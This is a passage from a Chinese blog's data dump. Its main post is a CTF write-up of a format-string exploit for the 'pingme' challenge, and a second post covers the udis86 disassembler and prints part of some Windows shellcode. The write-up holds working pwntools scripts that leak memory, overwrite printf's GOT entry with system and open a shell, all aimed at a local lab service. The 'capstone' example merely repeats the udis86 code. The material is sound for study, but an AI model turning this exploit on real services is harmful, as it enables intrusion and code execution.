&quot;%9$s.AAA&quot; + p32(start_addr)\n        p.sendline(payload)\n        data = p.recvuntil(&quot;.AAA&quot;)[:-4]\n        if data == &quot;&quot;:\n            data = &quot;\\x00&quot;\n        log.info(&quot;leaking: 0x%x --&gt; %s&quot; % (start_addr, data.encode(&#39;hex&#39;)))\n        result += data\n        start_addr += len(data)\n        p.close()\n    return result\nstart_addr = 0x8048000\nend_addr   = 0x8049000\ncode_bin = dump_memory(start_addr, end_addr)\nwith open(&quot;code.bin&quot;, &quot;wb&quot;) as f:\n    f.write(code_bin)\n    f.close()</code></pre>\n<h4 id=\"获取printf-got\"><a href=\"#获取printf-got\" class=\"headerlink\" title=\"获取printf_got\"></a>获取printf_got</h4><p>拿到部分重要的源代码后，就可以在rabin2中来识别符号了，imp.printf 虚拟地址为 0x08048400</p>\n<pre><code class=\"shell\">[0x08048490]&gt; is\n[Symbols]\n\nnth paddr       vaddr      bind   type   size lib name\n――――――――――――――――――――――――――――――――――――――――――――――――――――――\n11   ---------- 0x080499a4 GLOBAL OBJ    4        stdout\n12   0x0000071c 0x0804871c GLOBAL OBJ    4        _IO_stdin_used\n13   ---------- 0x080499a0 GLOBAL OBJ    4        stdin\n1    0x000003f0 0x080483f0 GLOBAL FUNC   16       imp.setbuf\n2    0x00000400 0x08048400 GLOBAL FUNC   16       imp.printf\n3    0x00000410 0x08048410 GLOBAL FUNC   16       imp.fgets\n4    0x00000420 0x08048420 GLOBAL FUNC   16       imp.alarm\n6    ---------- 0x00000000 WEAK   NOTYPE 16       imp.__gmon_start__\n7    0x00000440 0x08048440 GLOBAL FUNC   16       imp.strchr\n8    0x00000450 0x08048450 GLOBAL FUNC   16       imp.strlen\n9    0x00000460 0x08048460 GLOBAL FUNC   16       imp.__libc_start_main\n10   0x00000470 0x08048470 GLOBAL FUNC   16       imp.putchar</code></pre>\n<p>然后拿到got表中printf的地址  0x8049974</p>\n<pre><code class=\"shell\">[0x08048490]&gt; pd 3 @ 0x8048400\n        ╎   ; CALL XREF from main @ 0x8048664\n┌ 6: int sym.imp.printf (const char *format);\n│ bp: 0 (vars 0, args 0)\n│ sp: 0 (vars 0, args 0)\n│ rg: 0 (vars 0, args 0)\n└       ╎   0x08048400      ff2574990408   jmp dword [reloc.printf]    ; 0x8049974\n        ╎   0x08048406      6808000030     push panel.addr             ; 0x30000008\n        └─&lt; 0x0804840b      e9d0ffffff     jmp section..plt</code></pre>\n<h4 id=\"获取libc-printf找到对应libc\"><a href=\"#获取libc-printf找到对应libc\" class=\"headerlink\" title=\"获取libc_printf找到对应libc\"></a>获取libc_printf找到对应libc</h4><p>这里的got表指向的就是libc中的printf地址</p>\n<p>可以利用这个printf的地址，到libc库里去匹配，找到对应的libc，再拿到system的地址</p>\n<pre><code class=\"pyhton\">from pwn import *\ndef get_libc_printf():\n    addr = 0x8049974\n    p = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;)\n    p.recvline()\n    payload = &quot;%9$s.AAA&quot; + p32(addr)\n    p.sendline(payload)\n    data = p.recvuntil(&quot;.AAA&quot;)[:4].encode(&#39;hex&#39;)\n    data = data[6:8]+data[4:6]+data[2:4]+data[0:2]\n    log.info(&quot;leaking: 0x%x --&gt; 0x%s&quot; % (addr, data))\n    p.close()\nget_libc_printf()</code></pre>\n<p>我这里输入是860结尾，去<a href=\"https://libc.blukat.me/中搜索\" target=\"_blank\" rel=\"noopener\">https://libc.blukat.me/中搜索</a></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200521225248944.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200521225248944\"></p>\n<p>我这里由于libc版本比较新，网站没收录，所以自己导入搞一下</p>\n<p>用到开源代码<a href=\"https://github.com/niklasb/libc-database\" target=\"_blank\" rel=\"noopener\">https://github.com/niklasb/libc-database</a></p>\n<p>先加载一下libc</p>\n<pre><code class=\"shell\">cray@cray:~/SOFT/libc-database$ ./add /lib32/libc-2.28.so \nAdding local libc /lib32/libc-2.28.so (id local-8c74cfda272116c51d2de1e1bd19d1f9994d4d98  /lib32/libc-2.28.so)\n  -&gt; Writing libc to db/local-8c74cfda272116c51d2de1e1bd19d1f9994d4d98.so\n  -&gt; Writing symbols to db/local-8c74cfda272116c51d2de1e1bd19d1f9994d4d98.symbols\n  -&gt; Writing version info</code></pre>\n<p>…（未完待续</p>\n<p>拿到偏移后</p>\n<h4 id=\"利用-n特性重写printf-got\"><a href=\"#利用-n特性重写printf-got\" class=\"headerlink\" title=\"利用%n特性重写printf_got\"></a>利用%n特性重写printf_got</h4><p>脚本</p>\n<pre><code class=\"python\">payload = fmtstr_payload(7, {printf_got: system_addr})\np = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;)\np.recvline()\np.sendline(payload)\np.recv()\np.sendline(&#39;/bin/sh&#39;)\np.interactive()</code></pre>\n<p>最终我的exp：</p>\n<pre><code class=\"python\">from pwn import *\ndef eeexp():\n    printf_got = 0x8049974\n    system_offset = 0x0003e9e0\n    printf_offset = 0x00052860\n\n    p = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;)\n    p.recvline()\n    payload = &quot;%9$s.AAA&quot; + p32(printf_got)\n    p.sendline(payload)\n    data = p.recvuntil(&quot;.AAA&quot;)[:4].encode(&#39;hex&#39;)\n    data2 = data[6:8]+data[4:6]+data[2:4]+data[0:2]\n    printf_so = eval(&quot;0x{}&quot;.format(data2))\n    log.info(&quot;printf_so -&gt; 0x%x&quot; % printf_so)\n    system_so = printf_so + (system_offset-printf_offset) \n    log.info(&quot;system_got -&gt; 0x%x&quot; % system_so)\n\n    payload = fmtstr_payload(7,{printf_got:system_so})\n    p.sendline(payload)\n\n    p.recv()\n    p.sendline(&#39;/bin/sh&#39;)\n    p.interactive()\nif __name__ == &quot;__main__&quot;:\n    eeexp()\n</code></pre>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><p><a href=\"https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.2_pwn_njctf2017_pingme.md\" target=\"_blank\" rel=\"noopener\">https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.2_pwn_njctf2017_pingme.md</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>本文看不懂可以移步firmianay大佬看详细说明，我记录一些自己的方法。</p>\n<p>PLT表和GOT表的关系：<a href=\"https://www.jianshu.com/p/0ac63c3744dd\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/0ac63c3744dd</a></p>\n<h2 id=\"演示环境及工具\"><a href=\"#演示环境及工具\" class=\"headerlink\" title=\"演示环境及工具\"></a>演示环境及工具</h2><p>操作系统<strong>linux</strong></p>\n<pre><code class=\"shell\">cray@cray:~$ uname -a \nLinux cray 5.3.0-3-amd64 #1 SMP deepin 5.3.15-6apricot (2020-04-13) x86_64 GNU/Linux\ncray@cray:~/Documents/Demos$ ldd pingme \n    linux-gate.so.1 (0xf7edc000)\n    libc.so.6 =&gt; /lib32/libc.so.6 (0xf7cdc000)\n    /lib/ld-linux.so.2 (0xf7edd000)\n\ncray@cray:~/Documents/Demos$ ls -la /lib32/|grep &quot;libc.so.6&quot;\nlrwxrwxrwx  1 root root      12 3月   3 17:36 libc.so.6 -&gt; libc-2.28.so\ncray@cray:~/Documents/Demos$ file /lib32/libc-2.28.so \n/lib32/libc-2.28.so: ELF 32-bit LSB pie executable, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=5327eb7657b083923efe41de73fa7755045362d9, for GNU/Linux 3.2.0, stripped</code></pre>\n<p>调试工具<strong>radare2</strong></p>\n<pre><code class=\"shell\">cray@cray:~$ r2 -v\nradare2 4.5.0-git 0 @ linux-x86-64 git.4.5.0-git\ncommit: HEAD build: 2020-05-14__12:01:18</code></pre>\n<p>样本下载</p>\n<h3 id=\"整体思路\"><a href=\"#整体思路\" class=\"headerlink\" title=\"整体思路\"></a>整体思路</h3><p>由于没有给源文件，有格式化漏洞，所以思路找到利用偏移，dump源程序，先找到PLT表中的printf位置，再拿到got表中已经加载的实际printf在导入libc中的地址。可以在libc-database找到对应的偏移，最后使用%n的特性，重写got表的地址为libc_system的地址。</p>\n<h3 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h3><p>我们要自己构造环境，拿到pingme后，网上有很多用socat去重新加载的，但是效率很低 OTZ，这里也给一个 firmianay大佬的方案</p>\n<pre><code class=\"bash\">#!/bin/sh\nwhile true; do\n        num=`ps -ef | grep &quot;socat&quot; | grep -v &quot;grep&quot; | wc -l`\n        if [ $num -lt 5 ]; then\n                socat tcp4-listen:10001,reuseaddr,fork exec:./pingme &amp;\n        fi\ndone</code></pre>\n<p>我尝试使用ncat去加载，速度相当快</p>\n<pre><code class=\"shell\">ncat -vc ./pingme -lk 10001</code></pre>\n<h3 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h3><h4 id=\"格式化漏洞\"><a href=\"#格式化漏洞\" class=\"headerlink\" title=\"格式化漏洞\"></a>格式化漏洞</h4><p>参考<a href=\"https://www.bookstack.cn/read/CTF-All-In-One/doc-3.1.1_format_string.md\" target=\"_blank\" rel=\"noopener\">https://www.bookstack.cn/read/CTF-All-In-One/doc-3.1.1_format_string.md</a></p>\n<h4 id=\"找到利用点\"><a href=\"#找到利用点\" class=\"headerlink\" title=\"找到利用点\"></a>找到利用点</h4><p>利用点是 printf格式中<code>%5$s</code>的含义是：打印printf的第五个参数所指向的地址</p>\n<p>32位程序在传参时将参数放在栈中，经过尝试可以在第7个位置找到保存在栈中的输入数据，如果将他看作地址，就可以任意地址读取.</p>\n<p>这里使用pwntools中的exec_fmt来找利用点，原理都是一样的</p>\n<pre><code class=\"python\">from pwn import *\np = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;)\ndef exec_fmt(payload):\n    log.info(payload)\n    p.sendline(payload)\n    info = p.recv()\n    return info\nauto = FmtStr(exec_fmt)\noffset = auto.offset</code></pre>\n<p>输出如下</p>\n<pre><code class=\"javascript\">[+] Opening connection to 127.0.0.1 on port 10001: Done\n[*] aaaabaaacaaadaaaeaaaSTART%1$pEND\n[*] aaaabaaacaaadaaaeaaaSTART%2$pEND\n[*] aaaabaaacaaadaaaeaaaSTART%3$pEND\n[*] aaaabaaacaaadaaaeaaaSTART%4$pEND\n[*] aaaabaaacaaadaaaeaaaSTART%5$pEND\n[*] aaaabaaacaaadaaaeaaaSTART%6$pEND\n[*] aaaabaaacaaadaaaeaaaSTART%7$pEND\n[*] Found format string offset: 7\n[*] Closed connection to 127.0.0.1 port 10001</code></pre>\n<h4 id=\"dump源程序\"><a href=\"#dump源程序\" class=\"headerlink\" title=\"dump源程序\"></a>dump源程序</h4><p>虽然我们这里拿到了源程序，但是比赛中是没提供源程序的，所以要自己用前面的漏洞dump出来</p>\n<p>通过前面的漏洞，猜测程序未打开PIE，加载地址未0x8048000</p>\n<p>使用<code>&quot;%9$s.AAA&quot; + p32(start_addr)</code>格式化是因为printf在打印<code>\\x00</code>的时候会认为是截断符号，就不会打印任何东西，所以这里将第二个参数设置未<code>.AAA</code>来表示这次printf输出了多少数据，如果前面为空，那么就是截断符号，要手动修改.</p>\n<p>dump脚本如下</p>\n<pre><code class=\"python\">from pwn import *\ndef dump_memory(start_addr, end_addr):\n    result = &quot;&quot;\n    while start_addr &lt; end_addr:\n        p = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;)\n        p.recvline()\n        #print result.encode(&#39;hex&#39;)\n        payload = &quot;%9$s.AAA&quot; + p32(start_addr)\n        p.sendline(payload)\n        data = p.recvuntil(&quot;.AAA&quot;)[:-4]\n        if data == &quot;&quot;:\n            data = &quot;\\x00&quot;\n        log.info(&quot;leaking: 0x%x --&gt; %s&quot; % (start_addr, data.encode(&#39;hex&#39;)))\n        result += data\n        start_addr += len(data)\n        p.close()\n    return result\nstart_addr = 0x8048000\nend_addr   = 0x8049000\ncode_bin = dump_memory(start_addr, end_addr)\nwith open(&quot;code.bin&quot;, &quot;wb&quot;) as f:\n    f.write(code_bin)\n    f.close()</code></pre>\n<h4 id=\"获取printf-got\"><a href=\"#获取printf-got\" class=\"headerlink\" title=\"获取printf_got\"></a>获取printf_got</h4><p>拿到部分重要的源代码后，就可以在rabin2中来识别符号了，imp.printf 虚拟地址为 0x08048400</p>\n<pre><code class=\"shell\">[0x08048490]&gt; is\n[Symbols]\n\nnth paddr       vaddr      bind   type   size lib name\n――――――――――――――――――――――――――――――――――――――――――――――――――――――\n11   ---------- 0x080499a4 GLOBAL OBJ    4        stdout\n12   0x0000071c 0x0804871c GLOBAL OBJ    4        _IO_stdin_used\n13   ---------- 0x080499a0 GLOBAL OBJ    4        stdin\n1    0x000003f0 0x080483f0 GLOBAL FUNC   16       imp.setbuf\n2    0x00000400 0x08048400 GLOBAL FUNC   16       imp.printf\n3    0x00000410 0x08048410 GLOBAL FUNC   16       imp.fgets\n4    0x00000420 0x08048420 GLOBAL FUNC   16       imp.alarm\n6    ---------- 0x00000000 WEAK   NOTYPE 16       imp.__gmon_start__\n7    0x00000440 0x08048440 GLOBAL FUNC   16       imp.strchr\n8    0x00000450 0x08048450 GLOBAL FUNC   16       imp.strlen\n9    0x00000460 0x08048460 GLOBAL FUNC   16       imp.__libc_start_main\n10   0x00000470 0x08048470 GLOBAL FUNC   16       imp.putchar</code></pre>\n<p>然后拿到got表中printf的地址  0x8049974</p>\n<pre><code class=\"shell\">[0x08048490]&gt; pd 3 @ 0x8048400\n        ╎   ; CALL XREF from main @ 0x8048664\n┌ 6: int sym.imp.printf (const char *format);\n│ bp: 0 (vars 0, args 0)\n│ sp: 0 (vars 0, args 0)\n│ rg: 0 (vars 0, args 0)\n└       ╎   0x08048400      ff2574990408   jmp dword [reloc.printf]    ; 0x8049974\n        ╎   0x08048406      6808000030     push panel.addr             ; 0x30000008\n        └─&lt; 0x0804840b      e9d0ffffff     jmp section..plt</code></pre>\n<h4 id=\"获取libc-printf找到对应libc\"><a href=\"#获取libc-printf找到对应libc\" class=\"headerlink\" title=\"获取libc_printf找到对应libc\"></a>获取libc_printf找到对应libc</h4><p>这里的got表指向的就是libc中的printf地址</p>\n<p>可以利用这个printf的地址，到libc库里去匹配，找到对应的libc，再拿到system的地址</p>\n<pre><code class=\"pyhton\">from pwn import *\ndef get_libc_printf():\n    addr = 0x8049974\n    p = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;)\n    p.recvline()\n    payload = &quot;%9$s.AAA&quot; + p32(addr)\n    p.sendline(payload)\n    data = p.recvuntil(&quot;.AAA&quot;)[:4].encode(&#39;hex&#39;)\n    data = data[6:8]+data[4:6]+data[2:4]+data[0:2]\n    log.info(&quot;leaking: 0x%x --&gt; 0x%s&quot; % (addr, data))\n    p.close()\nget_libc_printf()</code></pre>\n<p>我这里输入是860结尾，去<a href=\"https://libc.blukat.me/中搜索\" target=\"_blank\" rel=\"noopener\">https://libc.blukat.me/中搜索</a></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200521225248944.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200521225248944\"></p>\n<p>我这里由于libc版本比较新，网站没收录，所以自己导入搞一下</p>\n<p>用到开源代码<a href=\"https://github.com/niklasb/libc-database\" target=\"_blank\" rel=\"noopener\">https://github.com/niklasb/libc-database</a></p>\n<p>先加载一下libc</p>\n<pre><code class=\"shell\">cray@cray:~/SOFT/libc-database$ ./add /lib32/libc-2.28.so \nAdding local libc /lib32/libc-2.28.so (id local-8c74cfda272116c51d2de1e1bd19d1f9994d4d98  /lib32/libc-2.28.so)\n  -&gt; Writing libc to db/local-8c74cfda272116c51d2de1e1bd19d1f9994d4d98.so\n  -&gt; Writing symbols to db/local-8c74cfda272116c51d2de1e1bd19d1f9994d4d98.symbols\n  -&gt; Writing version info</code></pre>\n<p>…（未完待续</p>\n<p>拿到偏移后</p>\n<h4 id=\"利用-n特性重写printf-got\"><a href=\"#利用-n特性重写printf-got\" class=\"headerlink\" title=\"利用%n特性重写printf_got\"></a>利用%n特性重写printf_got</h4><p>脚本</p>\n<pre><code class=\"python\">payload = fmtstr_payload(7, {printf_got: system_addr})\np = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;)\np.recvline()\np.sendline(payload)\np.recv()\np.sendline(&#39;/bin/sh&#39;)\np.interactive()</code></pre>\n<p>最终我的exp：</p>\n<pre><code class=\"python\">from pwn import *\ndef eeexp():\n    printf_got = 0x8049974\n    system_offset = 0x0003e9e0\n    printf_offset = 0x00052860\n\n    p = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;)\n    p.recvline()\n    payload = &quot;%9$s.AAA&quot; + p32(printf_got)\n    p.sendline(payload)\n    data = p.recvuntil(&quot;.AAA&quot;)[:4].encode(&#39;hex&#39;)\n    data2 = data[6:8]+data[4:6]+data[2:4]+data[0:2]\n    printf_so = eval(&quot;0x{}&quot;.format(data2))\n    log.info(&quot;printf_so -&gt; 0x%x&quot; % printf_so)\n    system_so = printf_so + (system_offset-printf_offset) \n    log.info(&quot;system_got -&gt; 0x%x&quot; % system_so)\n\n    payload = fmtstr_payload(7,{printf_got:system_so})\n    p.sendline(payload)\n\n    p.recv()\n    p.sendline(&#39;/bin/sh&#39;)\n    p.interactive()\nif __name__ == &quot;__main__&quot;:\n    eeexp()\n</code></pre>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><p><a href=\"https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.2_pwn_njctf2017_pingme.md\" target=\"_blank\" rel=\"noopener\">https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.2_pwn_njctf2017_pingme.md</a></p>\n"},{"title":"udis86和capstone基本使用","index_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/timg (1).jpg","banner_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/timg (1).jpg","_content":"\n### udis86\n\n第一次使用很麻烦，（自己太菜\n\nlib库要自己去生成，源文件缺少头文件，未解决。使用加号生成的lib库\n\n要导入\n\n![image-20200310173936136](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/typroa/image-20200310173936136.png)\n\n\n\n需要手动导入头文件`udis86.h`\n\nlib库文件`libudis86.lib` \n\n测试代码如下\n\n```c++\n#include <stdio.h>\n#include <udis86.h>\n#include <windows.h>\n#pragma comment(lib, \"libudis86.lib\") \n\nstruct FileInfo\n{\n\tLPVOID pAsmCode;\n\tint AsmLen;\n};\n\nFileInfo LoadFileToMem(const char* FilePath)\n{\n\tFileInfo sAsm;\n\tFILE* fp;\n\tfopen_s(&fp, FilePath, \"rb\");\n\tfseek(fp, 0, SEEK_END);\n\tsAsm.AsmLen = ftell(fp);\n\tfseek(fp, 0, SEEK_SET);\n\tsAsm.pAsmCode = new char[sAsm.AsmLen+1];\n\tZeroMemory(sAsm.pAsmCode, sAsm.AsmLen);\n\tfread_s(sAsm.pAsmCode, sAsm.AsmLen, 1, sAsm.AsmLen, fp);\n\tfclose(fp);\n\treturn sAsm;\n}\n\nint main()\n{\n\tFileInfo sAsm = LoadFileToMem(\"C:\\\\Users\\\\Cray\\\\Desktop\\\\dEMO\\\\Shellcode_64.bin\");\n\n\tud_t ud_obj;\n\tud_init(&ud_obj);\n\t//ud_set_input_file(&ud_obj, stdin);\t//从数据流中读入二进制数据\n\tud_set_input_buffer(&ud_obj, (PBYTE)sAsm.pAsmCode, sAsm.AsmLen);\t//内存中读入\n\tud_set_mode(&ud_obj, 64);\t//输出32位汇编\n\tud_set_syntax(&ud_obj, UD_SYN_INTEL); //INTEL 汇编语法\n\n\twhile (ud_disassemble(&ud_obj)) {\n\t\tprintf(\"\\t%s\\n\", ud_insn_asm(&ud_obj));\n\t}\n\tdelete[] sAsm.pAsmCode;\n\treturn 0;\n}\n```\n\n\n\n\n\n**disasm.exe 生成的二进制格式，用来加载shellcode也是相当好用的**\n\n\n\n```shell\nD:\\encodeDecodeOops\\udis>disasm.exe  -b 32 -f c Shellcode_32.bin\n\n#define SHELLCODE_32_SIZE 307\nchar SHELLCODE_32[] = {\n  /* 0000 */ \"\\x31\\xc9\"                     /* xor ecx, ecx                    */\n  /* 0002 */ \"\\x64\\x8b\\x41\\x30\"             /* mov eax, [fs:ecx+0x30]          */\n  /* 0006 */ \"\\x8b\\x40\\x0c\"                 /* mov eax, [eax+0xc]              */\n  /* 0009 */ \"\\x8b\\x70\\x14\"                 /* mov esi, [eax+0x14]             */\n  /* 000C */ \"\\xad\"                         /* lodsd                           */\n  /* 000D */ \"\\x96\"                         /* xchg esi, eax                   */\n  /* 000E */ \"\\xad\"                         /* lodsd                           */\n  /* 000F */ \"\\x8b\\x58\\x10\"                 /* mov ebx, [eax+0x10]             */\n  /* 0012 */ \"\\x8b\\x53\\x3c\"                 /* mov edx, [ebx+0x3c]             */\n  /* 0015 */ \"\\x01\\xda\"                     /* add edx, ebx                    */\n  /* 0017 */ \"\\x8b\\x52\\x78\"                 /* mov edx, [edx+0x78]             */\n  /* 001A */ \"\\x01\\xda\"                     /* add edx, ebx                    */\n  /* 001C */ \"\\x8b\\x72\\x20\"                 /* mov esi, [edx+0x20]             */\n  /* 001F */ \"\\x01\\xde\"                     /* add esi, ebx                    */\n  /* 0021 */ \"\\x31\\xc9\"                     /* xor ecx, ecx                    */\n  /* 0023 */ \"\\x41\"                         /* inc ecx                         */\n  /* 0024 */ \"\\xad\"                         /* lodsd                           */\n  /* 0025 */ \"\\x01\\xd8\"                     /* add eax, ebx                    */\n  /* 0027 */ \"\\x81\\x38\\x47\\x65\\x74\\x50\"     /* cmp dword [eax], 0x50746547     */\n  /* 002D */ \"\\x75\\xf4\"                     /* jnz 0x23                        */\n  /* 002F */ \"\\x81\\x78\\x04\\x72\\x6f\\x63\\x41\" /* cmp dword [eax+0x4], 0x41636f72 */\n  /* 0036 */ \"\\x75\\xeb\"                     /* jnz 0x23                        */\n  /* 0038 */ \"\\x81\\x78\\x08\\x64\\x64\\x72\\x65\" /* cmp dword [eax+0x8], 0x65726464 */\n  /* 003F */ \"\\x75\\xe2\"                     /* jnz 0x23                        */\n  /* 0041 */ \"\\x8b\\x72\\x24\"                 /* mov esi, [edx+0x24]             */\n  /* 0044 */ \"\\x01\\xde\"                     /* add esi, ebx                    */\n  /* 0046 */ \"\\x66\\x8b\\x0c\\x4e\"             /* mov cx, [esi+ecx*2]             */\n  \t...\n```\n\n### capstone \n\n也是需要自己导入lib库\n\n例子如下，网上也有教程\n\n\n\n```c++\n#include <stdio.h>\n#include <udis86.h>\n#include <windows.h>\n#pragma comment(lib, \"libudis86.lib\") \n\nstruct FileInfo\n{\n\tLPVOID pAsmCode;\n\tint AsmLen;\n};\n\nFileInfo LoadFileToMem(const char* FilePath)\n{\n\tFileInfo sAsm;\n\tFILE* fp;\n\tfopen_s(&fp, FilePath, \"rb\");\n\tfseek(fp, 0, SEEK_END);\n\tsAsm.AsmLen = ftell(fp);\n\tfseek(fp, 0, SEEK_SET);\n\tsAsm.pAsmCode = new char[sAsm.AsmLen+1];\n\tZeroMemory(sAsm.pAsmCode, sAsm.AsmLen);\n\tfread_s(sAsm.pAsmCode, sAsm.AsmLen, 1, sAsm.AsmLen, fp);\n\tfclose(fp);\n\treturn sAsm;\n}\n\nint main()\n{\n\tFileInfo sAsm = LoadFileToMem(\"C:\\\\Users\\\\Cray\\\\Desktop\\\\dEMO\\\\Shellcode_64.bin\");\n\n\tud_t ud_obj;\n\n\tud_init(&ud_obj);\n\t//ud_set_input_file(&ud_obj, stdin);\t//从数据流中读入二进制数据\n\tud_set_input_buffer(&ud_obj, (PBYTE)sAsm.pAsmCode, sAsm.AsmLen);\t//内存中读入\n\tud_set_mode(&ud_obj, 64);\t//输出32位汇编\n\tud_set_syntax(&ud_obj, UD_SYN_INTEL); //INTEL 汇编语法\n\n\twhile (ud_disassemble(&ud_obj)) {\n\t\tprintf(\"\\t%s\\n\", ud_insn_asm(&ud_obj));\n\t}\n\n\tdelete[] sAsm.pAsmCode;\n\treturn 0;\n}\n```\n\n","source":"_posts/udis86和capstone使用例子.md","raw":"---\ntitle: udis86和capstone基本使用\ntags: [汇编]\nindex_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/timg (1).jpg\nbanner_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/timg (1).jpg\n---\n\n### udis86\n\n第一次使用很麻烦，（自己太菜\n\nlib库要自己去生成，源文件缺少头文件，未解决。使用加号生成的lib库\n\n要导入\n\n![image-20200310173936136](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/typroa/image-20200310173936136.png)\n\n\n\n需要手动导入头文件`udis86.h`\n\nlib库文件`libudis86.lib` \n\n测试代码如下\n\n```c++\n#include <stdio.h>\n#include <udis86.h>\n#include <windows.h>\n#pragma comment(lib, \"libudis86.lib\") \n\nstruct FileInfo\n{\n\tLPVOID pAsmCode;\n\tint AsmLen;\n};\n\nFileInfo LoadFileToMem(const char* FilePath)\n{\n\tFileInfo sAsm;\n\tFILE* fp;\n\tfopen_s(&fp, FilePath, \"rb\");\n\tfseek(fp, 0, SEEK_END);\n\tsAsm.AsmLen = ftell(fp);\n\tfseek(fp, 0, SEEK_SET);\n\tsAsm.pAsmCode = new char[sAsm.AsmLen+1];\n\tZeroMemory(sAsm.pAsmCode, sAsm.AsmLen);\n\tfread_s(sAsm.pAsmCode, sAsm.AsmLen, 1, sAsm.AsmLen, fp);\n\tfclose(fp);\n\treturn sAsm;\n}\n\nint main()\n{\n\tFileInfo sAsm = LoadFileToMem(\"C:\\\\Users\\\\Cray\\\\Desktop\\\\dEMO\\\\Shellcode_64.bin\");\n\n\tud_t ud_obj;\n\tud_init(&ud_obj);\n\t//ud_set_input_file(&ud_obj, stdin);\t//从数据流中读入二进制数据\n\tud_set_input_buffer(&ud_obj, (PBYTE)sAsm.pAsmCode, sAsm.AsmLen);\t//内存中读入\n\tud_set_mode(&ud_obj, 64);\t//输出32位汇编\n\tud_set_syntax(&ud_obj, UD_SYN_INTEL); //INTEL 汇编语法\n\n\twhile (ud_disassemble(&ud_obj)) {\n\t\tprintf(\"\\t%s\\n\", ud_insn_asm(&ud_obj));\n\t}\n\tdelete[] sAsm.pAsmCode;\n\treturn 0;\n}\n```\n\n\n\n\n\n**disasm.exe 生成的二进制格式，用来加载shellcode也是相当好用的**\n\n\n\n```shell\nD:\\encodeDecodeOops\\udis>disasm.exe  -b 32 -f c Shellcode_32.bin\n\n#define SHELLCODE_32_SIZE 307\nchar SHELLCODE_32[] = {\n  /* 0000 */ \"\\x31\\xc9\"                     /* xor ecx, ecx                    */\n  /* 0002 */ \"\\x64\\x8b\\x41\\x30\"             /* mov eax, [fs:ecx+0x30]          */\n  /* 0006 */ \"\\x8b\\x40\\x0c\"                 /* mov eax, [eax+0xc]              */\n  /* 0009 */ \"\\x8b\\x70\\x14\"                 /* mov esi, [eax+0x14]             */\n  /* 000C */ \"\\xad\"                         /* lodsd                           */\n  /* 000D */ \"\\x96\"                         /* xchg esi, eax                   */\n  /* 000E */ \"\\xad\"                         /* lodsd                           */\n  /* 000F */ \"\\x8b\\x58\\x10\"                 /* mov ebx, [eax+0x10]             */\n  /* 0012 */ \"\\x8b\\x53\\x3c\"                 /* mov edx, [ebx+0x3c]             */\n  /* 0015 */ \"\\x01\\xda\"                     /* add edx, ebx                    */\n  /* 0017 */ \"\\x8b\\x52\\x78\"                 /* mov edx, [edx+0x78]             */\n  /* 001A */ \"\\x01\\xda\"                     /* add edx, ebx                    */\n  /* 001C */ \"\\x8b\\x72\\x20\"                 /* mov esi, [edx+0x20]             */\n  /* 001F */ \"\\x01\\xde\"                     /* add esi, ebx                    */\n  /* 0021 */ \"\\x31\\xc9\"                     /* xor ecx, ecx                    */\n  /* 0023 */ \"\\x41\"                         /* inc ecx                         */\n  /* 0024 */ \"\\xad\"                         /* lodsd                           */\n  /* 0025 */ \"\\x01\\xd8\"                     /* add eax, ebx                    */\n  /* 0027 */ \"\\x81\\x38\\x47\\x65\\x74\\x50\"     /* cmp dword [eax], 0x50746547     */\n  /* 002D */ \"\\x75\\xf4\"                     /* jnz 0x23                        */\n  /* 002F */ \"\\x81\\x78\\x04\\x72\\x6f\\x63\\x41\" /* cmp dword [eax+0x4], 0x41636f72 */\n  /* 0036 */ \"\\x75\\xeb\"                     /* jnz 0x23                        */\n  /* 0038 */ \"\\x81\\x78\\x08\\x64\\x64\\x72\\x65\" /* cmp dword [eax+0x8], 0x65726464 */\n  /* 003F */ \"\\x75\\xe2\"                     /* jnz 0x23                        */\n  /* 0041 */ \"\\x8b\\x72\\x24\"                 /* mov esi, [edx+0x24]             */\n  /* 0044 */ \"\\x01\\xde\"                     /* add esi, ebx                    */\n  /* 0046 */ \"\\x66\\x8b\\x0c\\x4e\"             /* mov cx, [esi+ecx*2]             */\n  \t...\n```\n\n### capstone \n\n也是需要自己导入lib库\n\n例子如下，网上也有教程\n\n\n\n```c++\n#include <stdio.h>\n#include <udis86.h>\n#include <windows.h>\n#pragma comment(lib, \"libudis86.lib\") \n\nstruct FileInfo\n{\n\tLPVOID pAsmCode;\n\tint AsmLen;\n};\n\nFileInfo LoadFileToMem(const char* FilePath)\n{\n\tFileInfo sAsm;\n\tFILE* fp;\n\tfopen_s(&fp, FilePath, \"rb\");\n\tfseek(fp, 0, SEEK_END);\n\tsAsm.AsmLen = ftell(fp);\n\tfseek(fp, 0, SEEK_SET);\n\tsAsm.pAsmCode = new 